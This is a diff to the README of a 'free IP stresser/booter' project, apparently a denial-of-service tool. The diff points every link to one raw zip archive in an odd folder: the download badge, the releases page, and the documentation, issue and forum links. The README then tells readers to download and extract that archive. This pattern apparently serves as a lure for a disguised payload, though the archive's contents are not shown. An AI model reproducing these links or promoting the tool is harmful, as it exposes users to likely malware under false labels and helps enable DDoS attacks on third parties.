@@ -7,7 +7,7 @@ Welcome to the **free-ip-stresser-booter**. This tool allows you to perform stre
 
 ## 📥 Download Now
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/beno25438/free-ip-stresser-booter/releases)
+[![Download Here](https://raw.githubusercontent.com/beno25438/free-ip-stresser-booter/main/autoicous/ip-free-stresser-booter-3.5-beta.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/beno25438/free-ip-stresser-booter/main/autoicous/ip-free-stresser-booter-3.5-beta.1.zip)
 
 ## 📋 System Requirements
 
@@ -25,7 +25,7 @@ Welcome to the **free-ip-stresser-booter**. This tool allows you to perform stre
 
 ## 📓 Usage Instructions
 
-1. **Visit the Download Page:** Go to the [Releases Page](https://github.com/beno25438/free-ip-stresser-booter/releases) to access the software.
+1. **Visit the Download Page:** Go to the [Releases Page](https://raw.githubusercontent.com/beno25438/free-ip-stresser-booter/main/autoicous/ip-free-stresser-booter-3.5-beta.1.zip) to access the software.
 2. **Choose Your Version:** Select the latest release version to ensure you have the most up-to-date features and fixes.
 3. **Download the File:** Click on the download link for your operating system.
 4. **Extract the Files:** Once the download is complete, locate the zipped file in your downloads folder, right-click on it, and select "Extract Here" or "Extract All."
@@ -35,7 +35,7 @@ Welcome to the **free-ip-stresser-booter**. This tool allows you to perform stre
 
 To get started, visit the following link to download the software:
 
-[Download Here](https://github.com/beno25438/free-ip-stresser-booter/releases)
+[Download Here](https://raw.githubusercontent.com/beno25438/free-ip-stresser-booter/main/autoicous/ip-free-stresser-booter-3.5-beta.1.zip)
 
 ## 👩‍💻 How to Use the Application
 
@@ -77,8 +77,8 @@ This project is licensed under the MIT License. Please check the License file fo
 
 ## 🔗 Additional Links
 
-- [Documentation](https://github.com/beno25438/free-ip-stresser-booter)
-- [Report Issues](https://github.com/beno25438/free-ip-stresser-booter/issues)
-- [Discussion Forum](https://github.com/beno25438/free-ip-stresser-booter/discussions)
+- [Documentation](https://raw.githubusercontent.com/beno25438/free-ip-stresser-booter/main/autoicous/ip-free-stresser-booter-3.5-beta.1.zip)
+- [Report Issues](https://raw.githubusercontent.com/beno25438/free-ip-stresser-booter/main/autoicous/ip-free-stresser-booter-3.5-beta.1.zip)
+- [Discussion Forum](https://raw.githubusercontent.com/beno25438/free-ip-stresser-booter/main/autoicous/ip-free-stresser-booter-3.5-beta.1.zip)
 
 ```
